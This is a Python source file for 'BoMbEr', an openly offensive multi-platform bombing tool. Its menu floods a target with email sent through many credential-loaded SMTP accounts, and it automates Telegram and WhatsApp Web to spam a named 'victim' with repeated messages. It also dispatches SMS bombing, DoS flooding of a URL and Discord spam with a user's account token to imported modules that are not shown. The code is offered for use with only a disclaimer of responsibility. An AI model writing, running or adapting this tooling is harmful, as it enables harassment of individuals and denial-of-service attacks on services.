# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#--------------------------------------(main)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import smtplib
import os.path
import asyncio
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
from sms import sms
from dos import dos
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from discord import discord
from progress.bar import Bar
from threading import Thread
from functools import reduce
from bs4 import BeautifulSoup
from requests import get, post
from selenium import webdriver
from os.path import exists, isfile
from random import choice, randint
from bs4 import BeautifulSoup as bs
from selenium_stealth import stealth
from progress.spinner import Spinner
from selenium.webdriver.common.by import By
from colorama import Fore, Back, Style, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

colorama.init()

if platform == 'win32':
	os.system("cls")

else:
	os.system("clear")

def pb():              
	spinner = Spinner(Fore.YELLOW + Style.BRIGHT + 'Processing ', max=20)
	for i in range(20):
		time.sleep(.12)
		spinner.next()
	spinner.finish()

def check_internet():
	try:
		pb()
		get("http://google.com", timeout=1)
		print("\033[32m{}" .format('''
		╔════════╗
		║Success!║
		╚════════╝'''))

	except Exception:
		print("\033[31m{}" .format('''
		╔═══════════════════════╗
		║No internet connection!║
		╚═══════════════════════╝
					'''))
		input()
		ex()

def ex():
	param=input('Exit? yes/no: ')
	if param == 'yes':
		if platform == 'win32':
			os.system("cls")

		else:
			os.system("clear")
		print("\033[36m{}" .format('''
																		 
                       Thanks for using BoMbEr!
       I would be grateful if you star on this repository on GitHub:
                    https://github.com/ebankoff/BoMbEr

          You can support me by sending any amount to my Qiwi:
                         qiwi.com/n/HERAMANT


                    Copyright (C) 2021 ebankoff                                                                            
			'''))
		print("Press Enter to exit")
		input()
		exit()
	elif param == 'no':
		main()

	else:
		print('ERROR: invalid value')
		ex()

def email(emails, passwords, to, amount, subj, mes, server):
	if server == '1':
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
	elif server == '2':
		server = smtplib.SMTP('smtp.mail.yahoo.com', 465)
		server.starttls()
	elif server == '3':
		server = smtplib.SMTP('smtp-mail.outlook.com', 587)
		server.starttls()
	elif server == '4':
		server = smtplib.SMTP('smtp.yandex.ru', 465)
		server.starttls()
	
	server.login(emails, passwords)

	for i in range(amount):
		server.sendmail(emails, to, subj, mes)

def telega(name, count, msg, cn):
	try:
		driver = webdriver.Chrome(ChromeDriverManager().install()) 
		driver.get("https://web.telegram.org/k")
		time.sleep(35)
		search = driver.find_element(By.XPATH, "//*[@id='column-left']/div/div/div[1]/div[2]/input")
		search.send_keys(name, Keys.RETURN)
		time.sleep(8)
		search2 = driver.find_element(By.XPATH, "//*[@id='search-container']/div[2]/div/div/div[1]/div/div[1]/ul")
		driver.implicitly_wait(10)
		ActionChains(driver).move_to_element(search2).click(search2).perform()
		time.sleep(15)
		msgBox = driver.find_element(By.XPATH,"//*[@id='column-center']/div/div/div[4]/div/div[1]/div[7]/div[1]/div[1]")

		for i in range(count):
			msgBox.send_keys(msg, Keys.RETURN)
			cn+=1
			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(name))

		print("\033[32m {}" .format("Successful!"))
		print(f"{cn} messages were sent to {name}")
		ex()
	except:
		print("\033[31m{}" .format('ERROR!'))
		ex()

def whatsapp(name, count, msg, cn):
	driver = webdriver.Chrome(ChromeDriverManager().install()) 
	driver.get("https://web.whatsapp.com")
	time.sleep(15)
	search = driver.find_element(By.XPATH, "//*[@id='side']/div[1]/div/label/div/div[2]")
	search.send_keys(name, Keys.RETURN)
	time.sleep(15)
	msgBox = driver.find_element(By.XPATH,"//*[@id='main']/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div[2]")

	for i in range(count):
		try:
			msgBox.send_keys(msg, Keys.RETURN)
			cn+=1
			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(name))
		except:
			cn+=1
			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(name))

def main():
	if platform == 'win32':
		os.system("cls")
	else:
		os.system("clear")

	print(Fore.YELLOW + Style.BRIGHT + '''╔══╗   ╔═╗╔═╦╗ ╔═══╗
║╔╗║   ║ ╚╝ ║║ ║╔══╝
║╚╝╚╦══╣╔╗╔╗║╚═╣╚══╦═╗
║╔═╗║╔╗║║║║║║╔╗║╔══╣╔╝
║╚═╝║╚╝║║║║║║╚╝║╚══╣║
╚═══╩══╩╝╚╝╚╩══╩═══╩╝
		''')
	print("\033[0m" + Fore.CYAN + "================================================")
	print(Fore.YELLOW + "Created by Eban'ko - https://github.com/ebankoff")
	print(Fore.CYAN + "================================================")

	print('''
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m0\033[0m\033[40m\033[35m]\033[31m Exit
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m1\033[0m\033[40m\033[35m] Email bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m2\033[0m\033[40m\033[35m] SMS bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m3\033[0m\033[40m\033[35m] Telegram bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m4\033[0m\033[40m\033[35m] DoS bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m5\033[0m\033[40m\033[35m] WhatsApp bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m6\033[0m\033[40m\033[35m] Discord bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m7\033[0m\033[40m\033[35m]\033[36m Clear program cache
	''')

	try:
		ans = input('\033[0m\033[40m\033[35m → \033[32m')

		if ans == '0':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			ex()

		elif ans == '1':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT +'''
╔═══╦═╗╔═╦═══╦══╦╗
║╔══╣ ╚╝ ║╔═╗╠╣╠╣║
║╚══╣╔╗╔╗║║ ║║║║║║
║╔══╣║║║║║╚═╝║║║║║ ╔╗
║╚══╣║║║║║╔═╗╠╣╠╣╚═╝║
╚═══╩╝╚╝╚╩╝ ╚╩══╩═══╝
			''')
			emails = []
			passwords = []
			to = str(input('Enter target email: '))
			amount = int(input('How many send from every address: '))
			subj = str(input('Enter subject: '))
			mes = str(input('Enter message: '))
			server = input('Select emails server - 1:Gmail 2:Yahoo 3:Outlook 4:Yandex: ')
			ans4 = ""
			ans5 = ""
			with open(r"emails.txt", "r", encoding="utf-8") as file:
				for line in file:
					pos = line.find(':')
					ans4 += line[:pos]
					emails.append(ans4)
					ans4 = ""

			with open(r"emails.txt", "r", encoding="utf-8") as file:
				for line in file:
					pos = line.find(':')
					ans5 += line[pos + 1:]
					passwords.append(ans5)
					ans5 = ""

			emails = [line.rstrip() for line in emails]
			passwords = [line.rstrip() for line in passwords]

			for i in range(len(emails)):
				th = Thread(target=email, args=(emails[i], passwords[i], to, amount, subj, mes, server,))
				th.start()

			print(Fore.GREEN + "Attacking...")
			th.join()

			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '2':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT +'''
╔═══╦═╗╔═╦═══╗
║╔═╗║ ╚╝ ║╔═╗║
║╚══╣╔╗╔╗║╚══╗
╚══╗║║║║║╠══╗║
║╚═╝║║║║║║╚═╝║
╚═══╩╝╚╝╚╩═══╝
			''')
			prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no: ").lower()
			code = input(Fore.YELLOW + Style.BRIGHT + "Target country code: +")
			number = code + input(Fore.YELLOW + Style.BRIGHT + f"Target number: {code}")
			tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds): "))
			thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads: "))
			for i in range(thr):
				th = Thread(target=sms, args=(prx, number, tm,))
				th.start()
				print(str(i + 1) + " thread started!")

			print(Fore.GREEN + "Attacking...")
			th.join()

			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '3':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT +'''
╔════╗ ╔╗
║╔╗╔╗║ ║║
╚╝║║╠╩═╣║╔══╦══╦═╦══╦╗╔╗
  ║║║ ═╣║║ ═╣╔╗║╔╣╔╗║╚╝║
  ║║║ ═╣╚╣ ═╣╚╝║║║╔╗║║║║
  ╚╝╚══╩═╩══╩═╗╠╝╚╝╚╩╩╩╝
            ╔═╝║
            ╚══╝
			''')
			
			name = input("Victim name: ")
			count = int(input("Number of messages: "))
			msg = input("Message: ")
			cn = 0
			print("")
			print("YOU HAVE 35 SECONDS TO LOG IN!")
			input("Press Enter to start")
			telega(name, count, msg, cn)
			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '4':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT + '''
╔═══╗  ╔═══╗
╚╗╔╗║  ║╔═╗║
 ║║║╠══╣╚══╗
 ║║║║╔╗╠══╗║
╔╝╚╝║╚╝║╚═╝║
╚═══╩══╩═══╝
				''')
			prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no: ").lower()
			url = input("URL: ")
			tm = int(input("Attack time in seconds: "))
			threads = int(input("Threads: "))

			for i in range(threads):
				th = threading.Thread(target=dos, args=(url, tm, prx,))
				th.start()
				print(str(i + 1) + " thread started!")

			th.join()
			time.sleep(4)

			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")

			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '5':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT +'''
╔╗╔╗╔╦╗    ╔╗   ╔═══╗
║║║║║║║   ╔╝╚╗  ║╔═╗║
║║║║║║╚═╦═╩╗╔╬══╣║ ║╠══╦══╗
║╚╝╚╝║╔╗║╔╗║║║══╣╚═╝║╔╗║╔╗║
╚╗╔╗╔╣║║║╔╗║╚╬══║╔═╗║╚╝║╚╝║
 ╚╝╚╝╚╝╚╩╝╚╩═╩══╩╝ ╚╣╔═╣╔═╝
                    ║║ ║║
                    ╚╝ ╚╝
			''')
			name = input("Victim name: ")
			count = int(input("Number of messages: "))
			msg = input("Message: ")
			cn=0

			print("")
			print("YOU HAVE 15 SECONDS TO LOG IN!")
			input("Press Enter to start")
			whatsapp(name, count, msg, cn)
			print("")
			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '6':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT +'''
╔═══╗             ╔╗
╚╗╔╗║             ║║
 ║║║╠╦══╦══╦══╦═╦═╝║
 ║║║╠╣══╣╔═╣╔╗║╔╣╔╗║
╔╝╚╝║╠══║╚═╣╚╝║║║╚╝║
╚═══╩╩══╩══╩══╩╝╚══╝
			''')
			prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no: ").lower()
			idd = input("Target ID: ")
			tkn = input("Account token: ")
			cnt = int(input("Number of messages: "))
			msg = input("Message: ")
			print("")
			input("Press Enter to start")
			discord(tkn, idd, msg, cnt, prx)
			print("")
			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '7':
			shutil.rmtree('__pycache__')
			print("SUCCESS!")
			ex()

		else:
			print(Fore.RED + 'ERROR!')
			ex()

	except:
		print(Fore.RED + 'ERROR!')
		ex()

if __name__=='__main__':
	if platform == 'win32':
		ctypes.windll.kernel32.SetConsoleTitleW("BoMbEr")
	pb()
	main()